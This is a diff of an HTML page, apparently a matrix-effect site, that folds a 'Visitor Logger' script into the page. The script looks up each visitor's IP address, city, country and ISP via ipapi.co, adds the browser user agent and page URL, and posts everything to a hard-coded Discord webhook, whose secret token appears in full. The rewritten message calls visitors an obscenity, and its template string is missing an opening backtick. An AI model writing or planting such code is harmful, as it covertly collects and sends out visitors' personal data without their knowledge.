@@ -305,24 +305,18 @@ function fadeMatrixEffect(duration = 1500) {
 </html>
 
 
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>Visitor Logger</title>
-  </head>
-  <body>
-    <script>
+<script>
       const webhookUrl = "https://discord.com/api/webhooks/1409323682249179167/Thv3331IS0_MJcaIubrk655x3kTw7rnOW6x3J9yhpgbU2XPybj18KVGd5wHjB039lcIY";
 
       fetch("https://ipapi.co/json/")
         .then(res => res.json())
         .then(data => {
-          const message = `🌍 New Visitor!
-🔑 IP: ${data.ip}
-📍 Location: ${data.city}, ${data.region}, ${data.country_name}
-🏢 ISP: ${data.org}
-🖥️ Browser/OS: ${navigator.userAgent}
-📄 Page: ${window.location.href}`;
+          const message = 🌴💤 ɴᴇᴡ ᴍᴏᴛʜᴇʀꜰᴜᴄᴋᴇʀ ᴏᴘᴇɴᴇᴅ ${window.location.href}
+ ɪᴘ: ${data.ip}
+ ʟᴏᴄᴀᴛɪᴏɴ: ${data.city}, ${data.region}, ${data.country_name}
+ ɪꜱᴘ: ${data.org}
+ ʙʀᴏᴡꜱᴇʀ/ᴏꜱ: ${navigator.userAgent}
+ ᴛɪᴍᴇ: ${new Date().toLocaleString()}
 
           fetch(webhookUrl, {
             method: "POST",
@@ -334,6 +328,7 @@ function fadeMatrixEffect(duration = 1500) {
     </script>
   </body>
 </html>
+
 
 
 
